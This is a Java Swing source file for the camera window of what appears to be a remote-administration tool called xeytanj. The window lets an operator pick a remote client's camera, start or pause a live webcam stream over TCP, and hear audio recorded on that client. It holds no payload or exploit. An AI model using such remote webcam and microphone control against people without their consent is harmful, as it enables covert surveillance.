package com.melardev.xeytanj.gui.camera;


import com.melardev.xeytanj.enums.NetworkProtocol;
import com.melardev.xeytanj.enums.Subject;
import com.melardev.xeytanj.gui.IGuiUserOwned;
import com.melardev.xeytanj.gui.mediator.IUiMediator;
import com.melardev.xeytanj.gui.sound.AudioMediaPlayer;
import com.melardev.xeytanj.models.CameraDeviceInfo;
import com.melardev.xeytanj.models.Client;
import com.melardev.xeytanj.services.IAppMessages;

import javax.sound.sampled.UnsupportedAudioFileException;
import javax.swing.*;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;
import java.util.List;

public class CameraGUI extends JFrame implements ActionListener, ChangeListener, IGuiUserOwned<CameraUiListener> {
    private final AudioMediaPlayer soundPlayer;
    private JTextField txtInterval;
    private JCheckBox chckbxMute;
    private JSlider sliderInterval;
    private JComboBox<String> comboCameraList;
    private JButton btnToggleCamera;
    private JLabel lblImage;
    private Component verticalGlue_1;
    private Component verticalGlue_2;
    private CameraUiListener listener;
    private IUiMediator mediator;
    private Client client;
    private IAppMessages messageProvider;

    public CameraGUI() {
        soundPlayer = new AudioMediaPlayer();

        try {
            soundPlayer.initMedia();
        } catch (UnsupportedAudioFileException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public boolean shouldRecordAudio() {
        return chckbxMute.isSelected();
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        Object source = e.getSource();
        int interval = Integer.parseInt(txtInterval.getText());

        if (source == btnToggleCamera) {
            if (btnToggleCamera.getText().equals("Play")) {
                btnToggleCamera.setText("Pause");
                btnToggleCamera.setIcon(new ImageIcon(CameraGUI.class.getResource("/icons/utils/pause.png")));

                //handler.onConfigChanged(getSelectedCameraId(), chckbxMute.isSelected(), interval);

                onCameraPlayClicked(getSelectedCameraId(), shouldRecordAudio(), interval);
            } else {
                btnToggleCamera.setText("Play");
                btnToggleCamera.setIcon(new ImageIcon(CameraGUI.class.getResource("/icons/utils/play.png")));
                onCameraPauseClicked();
            }
        }

    }

    private void onCameraPlayClicked(int selectedCameraId, boolean shouldRecordAudio, int interval) {
        this.listener.onCameraPlayClicked(getClient(), NetworkProtocol.TCP, selectedCameraId, shouldRecordAudio, interval);
    }

    private void onCameraPauseClicked() {
        this.listener.onCameraPauseClicked(getClient());
    }

    private int getSelectedCameraId() {
        String cameraId = (String) comboCameraList.getSelectedItem();
        int id = Integer.parseInt(cameraId.split(":")[0].trim());
        return id;
    }

    @Override
    public void stateChanged(ChangeEvent e) {
        Object source = e.getSource();
        if (source == sliderInterval) {
            txtInterval.setText(String.valueOf(sliderInterval.getValue()));
        }
    }


    @Override
    public void display() {

        GridBagLayout gridBagLayout = new GridBagLayout();
        gridBagLayout.columnWidths = new int[]{385, 0, 0, 1, 0};
        gridBagLayout.rowHeights = new int[]{1, 0, 0, 0, 0, 0, 0};
        gridBagLayout.columnWeights = new double[]{0.0, 0.0, 1.0, 0.0, Double.MIN_VALUE};
        gridBagLayout.rowWeights = new double[]{0.0, 1.0, 0.0, 0.0, 1.0, 0.0, Double.MIN_VALUE};
        getContentPane().setLayout(gridBagLayout);

        JPanel panel = new JPanel();
        GridBagConstraints gbc_panel = new GridBagConstraints();
        gbc_panel.gridheight = 5;
        gbc_panel.insets = new Insets(0, 0, 0, 5);
        gbc_panel.fill = GridBagConstraints.BOTH;
        gbc_panel.gridx = 0;
        gbc_panel.gridy = 1;
        getContentPane().add(panel, gbc_panel);
        GridBagLayout gbl_panel = new GridBagLayout();
        gbl_panel.columnWidths = new int[]{0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
        gbl_panel.rowHeights = new int[]{0, -97, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
        gbl_panel.columnWeights = new double[]{0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, Double.MIN_VALUE};
        gbl_panel.rowWeights = new double[]{0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, Double.MIN_VALUE};
        panel.setLayout(gbl_panel);

        Component verticalGlue = Box.createVerticalGlue();
        GridBagConstraints gbc_verticalGlue = new GridBagConstraints();
        gbc_verticalGlue.fill = GridBagConstraints.HORIZONTAL;
        gbc_verticalGlue.gridwidth = 9;
        gbc_verticalGlue.anchor = GridBagConstraints.SOUTH;
        gbc_verticalGlue.insets = new Insets(0, 0, 5, 0);
        gbc_verticalGlue.gridx = 0;
        gbc_verticalGlue.gridy = 1;
        panel.add(verticalGlue, gbc_verticalGlue);

        JLabel lblCameraList = new JLabel("Camera List");
        GridBagConstraints gbc_lblCameraList = new GridBagConstraints();
        gbc_lblCameraList.insets = new Insets(0, 0, 5, 5);
        gbc_lblCameraList.gridx = 2;
        gbc_lblCameraList.gridy = 3;
        panel.add(lblCameraList, gbc_lblCameraList);

        comboCameraList = new JComboBox<String>();
        GridBagConstraints gbc_comboCameraList = new GridBagConstraints();
        gbc_comboCameraList.insets = new Insets(0, 0, 5, 5);
        gbc_comboCameraList.fill = GridBagConstraints.HORIZONTAL;
        gbc_comboCameraList.gridx = 4;
        gbc_comboCameraList.gridy = 3;
        panel.add(comboCameraList, gbc_comboCameraList);

        txtInterval = new JTextField();
        txtInterval.setText("0");
        GridBagConstraints gbc_txtInterval = new GridBagConstraints();
        gbc_txtInterval.insets = new Insets(0, 0, 5, 5);
        gbc_txtInterval.fill = GridBagConstraints.HORIZONTAL;
        gbc_txtInterval.gridx = 2;
        gbc_txtInterval.gridy = 4;
        panel.add(txtInterval, gbc_txtInterval);
        txtInterval.setColumns(10);

        sliderInterval = new JSlider();
        sliderInterval.setMinorTickSpacing(500);
        sliderInterval.setMaximum(1000);
        sliderInterval.setMajorTickSpacing(200);
        sliderInterval.setValue(0);
        sliderInterval.setPaintTicks(true);
        sliderInterval.setPaintLabels(true);
        sliderInterval.addChangeListener(this);
        GridBagConstraints gbc_sliderInterval = new GridBagConstraints();
        gbc_sliderInterval.gridheight = 2;
        gbc_sliderInterval.insets = new Insets(0, 0, 5, 5);
        gbc_sliderInterval.gridx = 4;
        gbc_sliderInterval.gridy = 4;
        panel.add(sliderInterval, gbc_sliderInterval);

        JComboBox cameraMode = new JComboBox();
        GridBagConstraints gbc_cameraMode = new GridBagConstraints();
        gbc_cameraMode.insets = new Insets(0, 0, 5, 5);
        gbc_cameraMode.fill = GridBagConstraints.HORIZONTAL;
        gbc_cameraMode.gridx = 4;
        gbc_cameraMode.gridy = 6;
        panel.add(cameraMode, gbc_cameraMode);

        chckbxMute = new JCheckBox("Mute");
        GridBagConstraints gbc_chckbxMute = new GridBagConstraints();
        chckbxMute.addActionListener(this);
        gbc_chckbxMute.insets = new Insets(0, 0, 5, 5);
        gbc_chckbxMute.gridx = 2;
        gbc_chckbxMute.gridy = 8;
        panel.add(chckbxMute, gbc_chckbxMute);

        btnToggleCamera = new JButton("Play");
        btnToggleCamera.setIcon(new ImageIcon(CameraGUI.class.getResource("/icons/utils/play.png")));
        btnToggleCamera.addActionListener(this);
        GridBagConstraints gbc_btnToggleCamera = new GridBagConstraints();
        gbc_btnToggleCamera.gridheight = 2;
        gbc_btnToggleCamera.gridwidth = 2;
        gbc_btnToggleCamera.insets = new Insets(0, 0, 5, 5);
        gbc_btnToggleCamera.gridx = 3;
        gbc_btnToggleCamera.gridy = 8;
        panel.add(btnToggleCamera, gbc_btnToggleCamera);

        verticalGlue_1 = Box.createVerticalGlue();
        GridBagConstraints gbc_verticalGlue_1 = new GridBagConstraints();
        gbc_verticalGlue_1.insets = new Insets(0, 0, 0, 5);
        gbc_verticalGlue_1.gridx = 4;
        gbc_verticalGlue_1.gridy = 10;
        panel.add(verticalGlue_1, gbc_verticalGlue_1);

        JSeparator separator = new JSeparator();
        separator.setOrientation(SwingConstants.VERTICAL);
        GridBagConstraints gbc_separator = new GridBagConstraints();
        gbc_separator.insets = new Insets(0, 0, 5, 5);
        gbc_separator.gridx = 1;
        gbc_separator.gridy = 1;
        getContentPane().add(separator, gbc_separator);

        lblImage = new JLabel("New label");
        GridBagConstraints gbc_lblImage = new GridBagConstraints();
        gbc_lblImage.gridheight = 2;
        gbc_lblImage.insets = new Insets(0, 0, 5, 5);
        gbc_lblImage.gridx = 2;
        gbc_lblImage.gridy = 1;
        getContentPane().add(lblImage, gbc_lblImage);

        verticalGlue_2 = Box.createVerticalGlue();
        GridBagConstraints gbc_verticalGlue_2 = new GridBagConstraints();
        gbc_verticalGlue_2.insets = new Insets(0, 0, 5, 5);
        gbc_verticalGlue_2.gridx = 2;
        gbc_verticalGlue_2.gridy = 5;
        getContentPane().add(verticalGlue_2, gbc_verticalGlue_2);
        pack();
        setVisible(true);

        setDefaultCloseOperation(DISPOSE_ON_CLOSE);
        addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                super.windowClosing(e);
                notifyMediatorOnClose();
            }
        });

        disableUi();
    }

    @Override
    public void addListener(CameraUiListener listener) {
        this.listener = listener;
    }

    @Override
    public CameraUiListener getListener() {
        return listener;
    }

    @Override
    public IUiMediator getMediator() {
        return mediator;
    }

    @Override
    public void setMediator(IUiMediator mediator) {
        this.mediator = mediator;
    }

    @Override
    public void resetState() {

    }

    @Override
    public Client getClient() {
        return client;
    }

    @Override
    public void setClient(Client client) {
        this.client = client;
    }

    @Override
    public Subject getSubject() {
        return Subject.CAMERA;
    }

    @Override
    public void setStatus(String status) {

    }

    @Override
    public void disableUi() {
        btnToggleCamera.setEnabled(false);
        sliderInterval.setEnabled(false);
        txtInterval.setEnabled(false);
        comboCameraList.setEnabled(false);
    }

    public void updateUi(List<CameraDeviceInfo> cameraDeviceInfoList) {

        if (cameraDeviceInfoList.size() > 0) {
            enableUi();
            for (int index = 0; index < cameraDeviceInfoList.size(); index++) {
                comboCameraList.addItem(String.valueOf(cameraDeviceInfoList.get(index).getDeviceName()) + ":");
            }

        } else {
            comboCameraList.addItem("No available cameras");
            disableUi();
        }
    }

    private void enableUi() {
        btnToggleCamera.setEnabled(true);
        sliderInterval.setEnabled(true);
        txtInterval.setEnabled(true);
        comboCameraList.setEnabled(true);
    }


    public void updateUi(Icon image) {
        lblImage.setIcon(image);
        pack();
    }

    public void playAudio(byte[] data, int bytesRead) {
        while (!soundPlayer.completed)
            continue;
        soundPlayer.playRaw(data, bytesRead);
    }

    @Override
    public void setMessageProvider(IAppMessages messageProvider) {
        this.messageProvider = messageProvider;
    }

}
